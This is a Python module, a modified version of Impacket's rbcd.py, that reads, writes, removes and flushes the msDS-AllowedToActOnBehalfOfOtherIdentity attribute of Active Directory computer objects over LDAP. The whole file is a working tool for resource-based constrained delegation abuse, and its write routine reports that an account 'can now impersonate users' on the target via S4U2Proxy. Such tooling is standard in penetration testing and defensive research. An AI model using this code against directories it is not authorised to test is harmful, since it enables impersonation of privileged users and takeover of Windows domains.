#!/usr/bin/python3

# Modified version of Impacket's RBCD.py 

# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Python script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer
#
# Authors:
#   Remi Gascou (@podalirius_)
#   Charlie Bromberg (@_nwodtuhs)
#
#  ToDo:
# [ ]: allow users to set a ((-delegate-from-sid or -delegate-from-dn) and -delegate-to-dn) in order to skip ldapdomaindump and explicitely set the SID/DN

from src.core.logger_config import logger
import ldap3
from ldap3.protocol.formatters.formatters import format_sid

from impacket.ldap import ldaptypes

from ldap3.utils.conv import escape_filter_chars

def create_empty_sd():
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd['Revision'] = b'\x01'
    sd['Sbz1'] = b'\x00'
    sd['Control'] = 32772
    sd['OwnerSid'] = ldaptypes.LDAP_SID()
    # BUILTIN\Administrators
    sd['OwnerSid'].fromCanonical('S-1-5-32-544')
    sd['GroupSid'] = b''
    sd['Sacl'] = b''
    acl = ldaptypes.ACL()
    acl['AclRevision'] = 4
    acl['Sbz1'] = 0
    acl['Sbz2'] = 0
    acl.aces = []
    sd['Dacl'] = acl
    return sd

# Create an ALLOW ACE with the specified sid
def create_allow_ace(sid):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = 983551  # Full control
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    nace['Ace'] = acedata
    return nace


class RBCD(object):
    """docstring for setrbcd"""

    def __init__(self, ldap_server, ldap_session, delegate_to, basedn):
        super(RBCD, self).__init__()
        self.ldap_server = ldap_server
        self.ldap_session = ldap_session
        self.delegate_from = None
        self.delegate_to = delegate_to
        self.SID_delegate_from = None
        self.DN_delegate_to = None
        self.basedn = basedn

    def read(self):
        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logger.error('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act
        self.get_allowed_to_act()

        return

    def write(self, delegate_from):
        self.delegate_from = delegate_from

        # Get escalate user sid
        result = self.get_user_info(self.delegate_from)
        if not result:
            logger.error('Account to escalate does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.SID_delegate_from = str(result[1])

        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logger.error('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act and build security descriptor including previous data
        sd, targetuser = self.get_allowed_to_act()

        # writing only if SID not already in list
        if self.SID_delegate_from not in [ ace['Ace']['Sid'].formatCanonical() for ace in sd['Dacl'].aces ]:
            sd['Dacl'].aces.append(create_allow_ace(self.SID_delegate_from))
            self.ldap_session.modify(targetuser['dn'],
                                     {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE,
                                                                                   [sd.getData()]]})
            if self.ldap_session.result['result'] == 0:
                logger.info('Delegation rights modified successfully!')
                logger.info('%s can now impersonate users on %s via S4U2Proxy', self.delegate_from, self.delegate_to)
            else:
                if self.ldap_session.result['result'] == 50:
                    logger.error('Could not modify object, the server reports insufficient rights: %s',
                                  self.ldap_session.result['message'])
                elif self.ldap_session.result['result'] == 19:
                    logger.error('Could not modify object, the server reports a constrained violation: %s',
                                  self.ldap_session.result['message'])
                else:
                    logger.error('The server returned an error: %s', self.ldap_session.result['message'])
        else:
            logger.info('%s can already impersonate users on %s via S4U2Proxy', self.delegate_from, self.delegate_to)
            logger.info('Not modifying the delegation rights.')
        # Get list of allowed to act
        self.get_allowed_to_act()
        return

    def remove(self, delegate_from):
        self.delegate_from = delegate_from

        # Get escalate user sid
        result = self.get_user_info(self.delegate_from)
        if not result:
            logger.error('Account to escalate does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.SID_delegate_from = str(result[1])

        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logger.error('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act and build security descriptor including that data
        sd, targetuser = self.get_allowed_to_act()

        # Remove the entries where SID match the given -delegate-from
        sd['Dacl'].aces = [ace for ace in sd['Dacl'].aces if self.SID_delegate_from != ace['Ace']['Sid'].formatCanonical()]
        self.ldap_session.modify(targetuser['dn'],
                                 {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]})

        if self.ldap_session.result['result'] == 0:
            logger.info('Delegation rights modified successfully!')
        else:
            if self.ldap_session.result['result'] == 50:
                logger.error('Could not modify object, the server reports insufficient rights: %s',
                              self.ldap_session.result['message'])
            elif self.ldap_session.result['result'] == 19:
                logger.error('Could not modify object, the server reports a constrained violation: %s',
                              self.ldap_session.result['message'])
            else:
                logger.error('The server returned an error: %s', self.ldap_session.result['message'])
        # Get list of allowed to act
        self.get_allowed_to_act()
        return

    def flush(self):
        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logger.error('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act
        sd, targetuser = self.get_allowed_to_act()

        self.ldap_session.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, []]})
        if self.ldap_session.result['result'] == 0:
            logger.info('Delegation rights flushed successfully!')
        else:
            if self.ldap_session.result['result'] == 50:
                logger.error('Could not modify object, the server reports insufficient rights: %s',
                              self.ldap_session.result['message'])
            elif self.ldap_session.result['result'] == 19:
                logger.error('Could not modify object, the server reports a constrained violation: %s',
                              self.ldap_session.result['message'])
            else:
                logger.error('The server returned an error: %s', self.ldap_session.result['message'])
        # Get list of allowed to act
        self.get_allowed_to_act()
        return

    def get_allowed_to_act(self):
        # Get target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute
        self.ldap_session.search(self.DN_delegate_to, '(objectClass=*)', search_scope=ldap3.BASE,
                                 attributes=['SAMAccountName', 'objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        targetuser = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            targetuser = entry
        if not targetuser:
            logger.error('Could not query target user properties')
            return

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(
                data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
            if len(sd['Dacl'].aces) > 0:
                logger.info('Accounts allowed to act on behalf of other identity:')
                for ace in sd['Dacl'].aces:
                    SID = ace['Ace']['Sid'].formatCanonical()
                    SidInfos = self.get_sid_info(ace['Ace']['Sid'].formatCanonical())
                    if SidInfos:
                        SamAccountName = SidInfos[1]
                        logger.info('    %-10s   (%s)' % (SamAccountName, SID))
            else:
                logger.info('Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty')
        except IndexError:
            logger.info('Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty')
            # Create DACL manually
            sd = create_empty_sd()
        return sd, targetuser

    def get_user_info(self, samname):
        self.ldap_session.search(self.basedn, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            sid = format_sid(self.ldap_session.entries[0]['objectSid'].raw_values[0])
            return dn, sid
        except IndexError:
            logger.error('User not found in LDAP: %s' % samname)
            return False

    def get_sid_info(self, sid):
        self.ldap_session.search(self.basedn, '(objectSid=%s)' % escape_filter_chars(sid), attributes=['samaccountname'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            samname = self.ldap_session.entries[0]['samaccountname']
            return dn, samname
        except IndexError:
            logger.error('SID not found in LDAP: %s' % sid)
            return False